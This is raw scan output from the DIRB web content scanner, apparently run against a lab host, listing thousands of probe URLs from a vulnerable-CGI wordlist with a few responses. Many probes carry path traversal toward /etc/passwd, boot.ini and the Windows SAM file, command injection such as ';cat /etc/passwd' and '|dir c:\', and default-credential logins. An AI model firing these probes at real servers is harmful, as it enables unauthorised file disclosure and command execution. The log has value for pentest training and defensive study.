
-----------------
DIRB v2.22    
By The Dark Raver
-----------------
START_TIME: Mon Jan  1 13:34:04 2018
URL_BASE: http://10.10.10.56/
WORDLIST_FILES: /usr/share/wordlists/dirb/vulns/cgis.txt
-----------------
*** Generating Wordlist...
                                                                               
GENERATED WORDS: 3388
                                                                                                        
--> Testing: http://10.10.10.56/events4.nsf
                                                                                                        
--> Testing: http://10.10.10.56/log.nsf
                                                                                                        
--> Testing: http://10.10.10.56/names.nsf
                                                                                                        
--> Testing: http://10.10.10.56/LOGIN.PWD
                                                                                                        
--> Testing: http://10.10.10.56/USER/CONFIG.AP
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/mail
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/nph-error.pl
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/post-query
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/query
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/test-cgi.tcl
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/test-env
                                                                                                        
--> Testing: http://10.10.10.56/.perf
                                                                                                        
--> Testing: http://10.10.10.56/admin-serv/config/admpw
                                                                                                        
--> Testing: http://10.10.10.56/test.php%20
                                                                                                        
--> Testing: http://10.10.10.56/*.*
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/cgi_process
                                                                                                        
--> Testing: http://10.10.10.56/ht_root/wwwroot/-/local/httpd$map.conf
                                                                                                        
--> Testing: http://10.10.10.56/JUNK(10)
                                                                                                        
--> Testing: http://10.10.10.56/local/httpd$map.conf
                                                                                                        
--> Testing: http://10.10.10.56/tree
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/index.js0x70
                                                                                                        
--> Testing: http://10.10.10.56/%00/
                                                                                                        
--> Testing: http://10.10.10.56/%2e/
                                                                                                        
+ http://10.10.10.56/%2e/ (CODE:200|SIZE:137)
                                                                                                        
--> Testing: http://10.10.10.56/%2f/
                                                                                                        
--> Testing: http://10.10.10.56/%5c/
                                                                                                        
--> Testing: http://10.10.10.56/index.jsp%00x
                                                                                                        
--> Testing: http://10.10.10.56/weblogic
                                                                                                        
--> Testing: http://10.10.10.56/%a%s%p%d
                                                                                                        
+ http://10.10.10.56/%a%s%p%d (CODE:400|SIZE:303)
                                                                                                        
--> Testing: http://10.10.10.56/index.html%20
                                                                                                        
--> Testing: http://10.10.10.56/852566C90012664F
                                                                                                        
--> Testing: http://10.10.10.56/hidden.nsf
                                                                                                        
--> Testing: http://10.10.10.56/mail.box
                                                                                                        
--> Testing: http://10.10.10.56/open?
                                                                                                        
--> Testing: http://10.10.10.56/setup.nsf
                                                                                                        
--> Testing: http://10.10.10.56/statrep.nsf
                                                                                                        
--> Testing: http://10.10.10.56/webadmin.nsf
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/cgitest.exe
                                                                                                        
--> Testing: http://10.10.10.56/examples/servlet/AUX
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/hpnst.exe?c=p+i=SrvSystemInfo.html
                                                                                                        
--> Testing: http://10.10.10.56/cfdocs/cfmlsyntaxcheck.cfm
                                                                                                        
--> Testing: http://10.10.10.56/Config1.htm
                                                                                                        
--> Testing: http://10.10.10.56/contents/extensions/asp/1
                                                                                                        
--> Testing: http://10.10.10.56/WebAdmin.dll?View=Logon
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/Pbcgi.exe
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/testcgi.exe
                                                                                                        
--> Testing: http://10.10.10.56/cgi-win/cgitest.exe
                                                                                                        
--> Testing: http://10.10.10.56/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
                                                                                                        
--> Testing: http://10.10.10.56/c/winnt/system32/cmd.exe?/c+dir+/OG
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/snorkerz.bat
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/snorkerz.cmd
                                                                                                        
--> Testing: http://10.10.10.56/msadc/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir+c:%5c
                                                                                                        
--> Testing: http://10.10.10.56/msadc/samples/adctest.asp
                                                                                                        
--> Testing: http://10.10.10.56/nikto.ida
                                                                                                        
--> Testing: http://10.10.10.56/SUNWmc/htdocs/
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/webfind.exe?keywords=01234567890123456789
                                                                                                        
--> Testing: http://10.10.10.56/cgi-shl/win-c-sample.exe
                                                                                                        
--> Testing: http://10.10.10.56/examples/servlet/TroubleShooter
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/ans.pl?p=../../../../../usr/bin/id|&blah
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/ans/ans.pl?p=../../../../../usr/bin/id|&blah
                                                                                                        
--> Testing: http://10.10.10.56/goform/CheckLogin?login=root&password=tslinux
                                                                                                        
--> Testing: http://10.10.10.56/[SecCheck]/..%2f../ext.ini
                                                                                                        
--> Testing: http://10.10.10.56/[SecCheck]/..%255c..%255c../ext.ini
                                                                                                        
--> Testing: http://10.10.10.56/[SecCheck]/..%252f..%252f../ext.ini
                                                                                                        
--> Testing: http://10.10.10.56/cgi/cfdocs/expeval/ExprCalc.cfm?OpenFilePath=c:\winnt\win.ini
                                                                                                        
--> Testing: http://10.10.10.56/cgi/cfdocs/expeval/ExprCalc.cfm?OpenFilePath=c:\windows\win.ini
                                                                                                        
--> Testing: http://10.10.10.56/.nsf/../winnt/win.ini
                                                                                                        
--> Testing: http://10.10.10.56/prxdocs/misc/prxrch.idq?CiTemplate=../../../../../../../../../../winnt/w
                                                                                                        
--> Testing: http://10.10.10.56/query.idq?CiTemplate=../../../../../../../../../../winnt/win.ini
                                                                                                        
--> Testing: http://10.10.10.56/iissamples/issamples/fastq.idq?CiTemplate=../../../../../../../../../../
                                                                                                        
--> Testing: http://10.10.10.56/iissamples/issamples/query.idq?CiTemplate=../../../../../../../../../../
                                                                                                        
--> Testing: http://10.10.10.56/default.htm%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%
                                                                                                        
+ http://10.10.10.56/default.htm%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20% (CODE:400|SIZE:303)
                                                                                                        
--> Testing: http://10.10.10.56/................../config.sys
                                                                                                        
--> Testing: http://10.10.10.56/cfdocs/exampleapp/email/getfile.cfm?filename=c:\boot.ini
                                                                                                        
--> Testing: http://10.10.10.56/cfdocs/exampleapp/docs/sourcewindow.cfm?Template=c:\boot.ini
                                                                                                        
--> Testing: http://10.10.10.56/cfdocs/expeval/exprcalc.cfm?OpenFilePath=c:\boot.ini
                                                                                                        
--> Testing: http://10.10.10.56/netget?sid=user&msg=300&file=../../../../../../../../../boot.ini
                                                                                                        
--> Testing: http://10.10.10.56/netget?sid=user&msg=300&file=../../../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/php/php.exe?c:\winnt\boot.ini
                                                                                                        
--> Testing: http://10.10.10.56/phpping/index.php?pingto=www.test.com%20|%20dir%20c:\
                                                                                                        
--> Testing: http://10.10.10.56/scripts/db4web_c.exe/dbdirname/c%3A%5Cboot.ini
                                                                                                        
--> Testing: http://10.10.10.56/us/cgi-bin/sewse.exe?d:/internet/sites/us/sewse/jabber/comment2.jse+c:\b
                                                                                                        
--> Testing: http://10.10.10.56/wx/s.dll?d=/boot.ini
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/Album?mode=album&album=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fe
                                                                                                        
--> Testing: http://10.10.10.56/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../boot.ini
                                                                                                        
--> Testing: http://10.10.10.56/servlet/webacc?User.html=../../../../../../../../../../../../../../../..
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/SQLServ/sqlbrowse.asp?filepath=c:\&Opt=3
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/stats/statsbrowse.asp?filepath=c:\&Opt=3
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/test.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/input.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/input2.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
                                                                                                        
--> Testing: http://10.10.10.56/ssi/envout.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\
                                                                                                        
--> Testing: http://10.10.10.56/php/php.exe?c:\boot.ini
                                                                                                        
--> Testing: http://10.10.10.56/../../../../../../../../../boot.ini
                                                                                                        
--> Testing: http://10.10.10.56/../../../../winnt/repair/sam._
                                                                                                        
--> Testing: http://10.10.10.56/..\\..\\..\\..\\..\\..\\..\\boot.ini
                                                                                                        
--> Testing: http://10.10.10.56///etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56///etc/hosts
                                                                                                        
--> Testing: http://10.10.10.56////./../.../boot.ini
                                                                                                        
--> Testing: http://10.10.10.56/.cobalt/sysManage/../admin/.htaccess
                                                                                                        
--> Testing: http://10.10.10.56/albums/userpics/Copperminer.jpg.php?cat%20/etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/autohtml.php?op=modload&mainfile=x&name=/etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/atomicboard/index.php?location=../../../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/current/modules.php?mod=fm&file=../../../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/current/index.php?site=demos&bn=../../../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%
                                                                                                        
--> Testing: http://10.10.10.56/DomainFiles/*//../../../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/docs/showtemp.cfm?TYPE=JPEG&FILE=c:\boot.ini
                                                                                                        
--> Testing: http://10.10.10.56/ezhttpbench.php?AnalyseSite=/etc/passwd&NumLoops=1
                                                                                                        
--> Testing: http://10.10.10.56/index.php?download=/winnt/win.ini
                                                                                                        
--> Testing: http://10.10.10.56/index.php?download=/windows/win.ini
                                                                                                        
--> Testing: http://10.10.10.56/index.php?download=/etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/index.php?|=../../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/index.php?page=../../../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/index.php?page=../../../../../../../../../../boot.ini
                                                                                                        
--> Testing: http://10.10.10.56/index.php?l=forum/view.php&topic=../../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/jsp/jspsamp/jspexamples/viewsource.jsp?source=../../../../../../../../..
                                                                                                        
--> Testing: http://10.10.10.56/jsp/jspsamp/jspexamples/viewsource.jsp?source=../../../../../../../../..
                                                                                                        
--> Testing: http://10.10.10.56/k/home?dir=/&file=../../../../../../../../etc/passwd&lang=kor
                                                                                                        
--> Testing: http://10.10.10.56/nph-showlogs.pl?files=../../../../../../../../etc/passwd&filter=.*&submi
                                                                                                        
--> Testing: http://10.10.10.56/nph-showlogs.pl?files=../../../../../../../../etc/&filter=.*&submit=Go&l
                                                                                                        
--> Testing: http://10.10.10.56/phprocketaddin/?page=../../../../../../../../../../boot.ini
                                                                                                        
--> Testing: http://10.10.10.56/phpwebfilemgr/index.php?f=../../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/phpwebfilemgr/index.php?f=../../../../../../../../../etc
                                                                                                        
--> Testing: http://10.10.10.56/phptonuke.php?filnavn=/etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/put/cgi-bin/putport.exe?SWAP&BOM&OP=none&Lang=en-US&PutHtml=../../../../
                                                                                                        
--> Testing: http://10.10.10.56/ROADS/cgi-bin/search.pl?form=../../../../../../../../../../etc/passwd%00
                                                                                                        
--> Testing: http://10.10.10.56/support/common.php?f=0&ForumLang=../../../../../../../../../../etc/passw
                                                                                                        
--> Testing: http://10.10.10.56/viewpage.php?file=/etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/Web_Store/web_store.cgi?page=../../../../../../../../../../etc/passwd%00
                                                                                                        
--> Testing: http://10.10.10.56/webMathematica/MSP?MSPStoreID=..\..\..\..\..\..\..\..\..\..\boot.ini&MSP
                                                                                                        
--> Testing: http://10.10.10.56/webMathematica/MSP?MSPStoreID=../../../../../../../../../../etc/passwd&M
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/admin.cgi?list=../../../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/14all.cgi?cfg=../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/14all-1.1.cgi?cfg=../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/anacondaclip.pl?template=../../../../../../../../../../etc/passw
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/auktion.cgi?menue=../../../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/bigconf.cgi?command=view_textfile&file=/etc/passwd&filters=
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/bb-hostsvc.sh?HOSTSVC=../../../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/bb-hist?HISTFILE=../../../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/bb-hist.sh?HISTFILE=../../../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/common.php?f=0&ForumLang=../../../../../../../../../../etc/passw
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/commerce.cgi?page=../../../../../../../../../../etc/passwd%00ind
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/cgiforum.pl?thesection=../../../../../../../../../../etc/passwd%
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/cal_make.pl?p0=../../../../../../../../../../etc/passwd%00
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/db4web_c/dbdirname//etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/directorypro.cgi?want=showcat&show=../../../../../../../../../..
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/emumail/emumail.cgi?type=/../../../../../../../../../../../../..
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/emumail.cgi?type=/../../../../../../../../../../../../../../../.
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/emu/html/emumail.cgi?type=/../../../../../../../../../../../../.
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/faxsurvey?cat%20/etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/faqmanager.cgi?toc=/etc/passwd%00
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/ezshopper/search.cgi?user_id=id&database=dbase1.exm&template=../
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/formmail?recipient=root@localhost%0Acat%20/etc/passwd&email=joeu
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/formmail.pl?recipient=root@localhost%0Acat%20/etc/passwd&email=j
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/generate.cgi?content=../../../../../../../../../../winnt/win.ini
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/generate.cgi?content=../../../../../../../../../../windows/win.i
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/generate.cgi?content=../../../../../../../../../../etc/passwd%00
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/htmlscript?../../../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/htgrep?file=index.html&hdr=/etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/hsx.cgi?show=../../../../../../../../../../../etc/passwd%00
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/sewse?/home/httpd/html/sewse/jabber/comment2.jse+/etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/sbcgi/sitebuilder.cgi
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/mrtg.cgi?cfg=../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/mrtg.cfg?cfg=../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/main.cgi?board=FREE_BOARD&command=down_load&filename=../../../..
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/mail/nph-mr.cgi?do=loginhelp&configLanguage=../../../../../../..
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/mail/emumail.cgi?type=/../../../../../../../../../../../../../..
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/loadpage.cgi?user_id=1&file=..\\..\\..\\..\\..\\..\\..\\..\\winn
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/loadpage.cgi?user_id=1&file=../../../../../../../../../../etc/pa
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/htsearch?exclude=%60/etc/passwd%60
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/shop.cgi?page=../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/sendtemp.pl?templ=../../../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/search/search.cgi?keys=*&prc=any&catigory=../../../../../../../.
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/search.pl?form=../../../../../../../../../../etc/passwd%00
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/search.cgi?..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/search.cgi?..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/quickstore.cgi?page=../../../../../../../../../../etc/passwd%00h
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/publisher/search.cgi?dir=jobs&template=;cat%20/etc/passwd|&outpu
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/php.cgi?/etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/pals-cgi?palsAction=restart&documentName=/etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/opendir.php?/etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/nph-emumail.cgi?type=/../../../../../../../../../../../../../../
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/newsdesk.cgi?t=../../../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/netauth.cgi?cmd=show&page=../../../../../../../../../../etc/pass
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/multihtml.pl?multi=/etc/passwd%00html
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/webdist.cgi?distloc=;cat%20/etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/way-board/way-board.cgi?db=/etc/passwd%00
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/way-board.cgi?db=/etc/passwd%00
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/view_item?HTML_FILE=../../../../../../../../../../etc/passwd%00
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/viewsource?/etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/ttawebtop.cgi/?action=start&pg=../../../../../../../../../../etc
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/traffic.cgi?cfg=../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/technote/main.cgi?board=FREE_BOARD&command=down_load&filename=/.
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/talkback.cgi?article=../../../../../../../../etc/passwd%00&actio
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/story/story.pl?next=../../../../../../../../../../etc/passwd%00
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/story.pl?next=../../../../../../../../../../etc/passwd%00
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/store/index.cgi?page=../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/store.cgi?StartID=../../../../../../../../../../etc/passwd%00.ht
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/ssi//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
                                                                                                        
+ http://10.10.10.56/cgi-bin/ssi//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd (CODE:400|SIZE:303)
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/sojourn.cgi?cat=../../../../../../../../../../etc/password%00
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/simple/view_page?mv_arg=|cat%20/etc/passwd|
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/shopper.cgi?newpage=../../../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/servlet/webacc?User.html=../../../../../../../../../../../../../../../..
                                                                                                        
--> Testing: http://10.10.10.56/webcalendar/forum.php?user_inc=../../../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/logbook.pl?file=../../../../../../../bin/cat%20/etc/passwd%00|
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/sawmill5?rfcf+%22/etc/passwd%22+spbn+1,1,21,1,1,1,1
                                                                                                        
--> Testing: http://10.10.10.56/page.cgi?../../../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/edittag/edittag.cgi?file=%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/base/webmail/readmsg.php?mailbox=../../../../../../../../../../../../../
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/zml.cgi?file=../../../../../../../../../../etc/passwd%00
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/YaBB.pl?board=news&action=display&num=../../../../../../../../..
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/whois_raw.cgi?fqdn=%0Acat%20/etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/whois/whois.cgi?lookup=;&ext=/bin/cat%20/etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/whois.cgi?lookup=;&ext=/bin/cat%20/etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/webspirs.cgi?sp.nextform=../../../../../../../../../../etc/passw
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/webplus?script=../../../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/webmail/html/emumail.cgi?type=/../../../../../../../../../../../
                                                                                                        
--> Testing: http://10.10.10.56/athenareg.php?pass=%20;cat%20/etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/search?NS-query-pat=../../../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/search?NS-query-pat=..\..\..\..\..\..\..\..\..\..\boot.ini
                                                                                                        
--> Testing: http://10.10.10.56/..\..\..\..\..\..\temp\temp.class
                                                                                                        
--> Testing: http://10.10.10.56/../../../../../../../../../../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/.../.../.../.../.../.../.../.../.../boot.ini
                                                                                                        
--> Testing: http://10.10.10.56/................../etc/passwd
                                                                                                        
--> Testing: http://10.10.10.56/%3f.jsp
                                                                                                        
--> Testing: http://10.10.10.56/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini
                                                                                                        
+ http://10.10.10.56/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini (CODE:400|SIZE:303)
                                                                                                        
--> Testing: http://10.10.10.56/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
                                                                                                        
+ http://10.10.10.56/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd (CODE:400|SIZE:303)
                                                                                                        
--> Testing: http://10.10.10.56/%00
                                                                                                        
--> Testing: http://10.10.10.56/ca//\\../\\../\\../\\../\\../\\../\\windows/\\win.ini
                                                                                                        
--> Testing: http://10.10.10.56/ca/..\\..\\..\\..\\..\\..\\/\\etc/\\passwd
                                                                                                        
--> Testing: http://10.10.10.56/ca/..\\..\\..\\..\\..\\..\\..\\..\\winnt/\\win.ini
                                                                                                        
--> Testing: http://10.10.10.56/admentor/adminadmin.asp
                                                                                                        
--> Testing: http://10.10.10.56/POSTNUKEMy_eGallery/public/displayCategory.php
                                                                                                        
--> Testing: http://10.10.10.56/cgi-bin/classifieds/index.cgi
                                                                                                        
